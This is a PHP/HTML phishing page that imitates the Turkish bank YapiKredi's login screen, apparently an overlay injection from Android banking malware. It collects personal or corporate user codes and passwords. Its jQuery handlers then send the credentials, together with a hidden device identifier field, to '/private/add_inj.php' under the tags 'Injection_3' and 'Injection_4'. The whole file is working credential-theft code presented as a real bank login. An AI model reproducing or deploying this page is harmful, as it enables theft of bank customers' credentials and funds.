<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>YapiKredi</title>

    <link rel="stylesheet" href="tr/YapiKredi/css/normalize.css">
    <link rel="stylesheet" href="tr/YapiKredi/css/main.css">
    <link rel="stylesheet" href="tr/YapiKredi/css/ykb.css">

    <script src="tr/YapiKredi/js/jquery.min.js"></script>
    <script src="tr/YapiKredi/js/viewport.js"></script>
    <script src="tr/YapiKredi/js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
?>

<body>
    <div class="row">
        <div class="form_header">
            <img src="tr/YapiKredi/images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" id="form" class="wrapper">
                
						<div class="row" id="select_type">
						<div class="content">

							<div class="btn_wr">
								<button class="sign_btn" id="pers_btn" type=button>
									B&#304;REYSEL <img src="tr/YapiKredi/images/arr.png" alt="">
								</button>
							</div>

							<div class="btn_wr">
								<button class="sign_btn"  id="corp_btn">
									KURUMSAL <img src="tr/YapiKredi/images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>

<script>

function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}

$(document).ready(function() {
$('#pers_btn').click(function(){
$('#row_pers').show();
$('#row_corp').remove();
$('#select_type').remove();
return false;
});

$('#corp_btn').click(function(){
$('#row_corp').show();
$('#row_pers').remove();
$('#select_type').remove();
return false;
});




$('#row_corp .sign_btn').click(function(){
if (($('#row_corp input').eq(0).val().length < 5) || (!checkBad($('#row_corp input').eq(0).val()))) {$('#row_corp input').eq(0).addClass('inpError'); $('#row_corp input').eq(0).focus(); return false;} else $('#row_corp input').eq(0).removeClass('inpError');
if (($('#row_corp input').eq(1).val().length < 5) || (!checkBad($('#row_corp input').eq(1).val()))) {$('#row_corp input').eq(1).addClass('inpError'); $('#row_corp input').eq(1).focus(); return false;} else $('#row_corp input').eq(1).removeClass('inpError');
if (($('#row_corp input').eq(2).val().length < 5) || (!checkBad($('#row_corp input').eq(2).val()))) {$('#row_corp input').eq(2).addClass('inpError'); $('#row_corp input').eq(2).focus(); return false;} else $('#row_corp input').eq(2).removeClass('inpError');

var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login_"].value; 
var login2 = document.forms["form"].elements["login2_"].value;
var pass = document.forms["form"].elements["pass_"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_3|YapiKredi|"+login1+"|"+pass+"|"+login2);

//sendForm(true);
//closeWindow();
return false;
});

$('#row_pers .sign_btn').click(function(){
if (($('#row_pers input').eq(0).val().length < 5) || (!checkBad($('#row_pers input').eq(0).val()))) {$('#row_pers input').eq(0).addClass('inpError'); $('#row_pers input').eq(0).focus(); return false;} else $('#row_pers input').eq(0).removeClass('inpError');
if (($('#row_pers input').eq(1).val().length < 5) || (!checkBad($('#row_pers input').eq(1).val()))) {$('#row_pers input').eq(1).addClass('inpError'); $('#row_pers input').eq(1).focus(); return false;} else $('#row_pers input').eq(1).removeClass('inpError');

var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login"].value; 
var pass = document.forms["form"].elements["pass"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_4|YapiKredi|"+login1+"|"+pass);

//sendForm(true);
//closeWindow();
return false;
});

});
</script>
<style>

.inpError{

border: 2px solid red;
}
</style>
					<div class="row" id="row_pers" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 TCKN veya Kullan&#305;c&#305; Kodu 
								</div>






								<div class="inp_wr">


									<input type="text" name="field3" id="login" class="main_input" maxlength=11 required="">


								</div>
							</div>




							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" name="field4" id="pass" class="main_input" maxlength=8 required="">
									<input type="hidden" name="field2" value="pers_acc">
								</div>
							</div>
							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351; <img src="tr/YapiKredi/images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>

					<div class="row" id="row_corp" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									Firma Kodu / M&#252;&#351;teri Kodu
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" id="login_" class="main_input" maxlength=10 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Kullan&#305;c&#305; Kodu
								</div>
								<div class="inp_wr">
									<input type="text" name="field3" id="login2_" class="main_input" maxlength=10 required="" >
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" name="field4" id="pass_" class="main_input" maxlength=8 required="">
								</div>
							</div>





							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351; <img src="tr/YapiKredi/images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>				

<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>

				</form>
			</div>
		</div>
</body>

</html>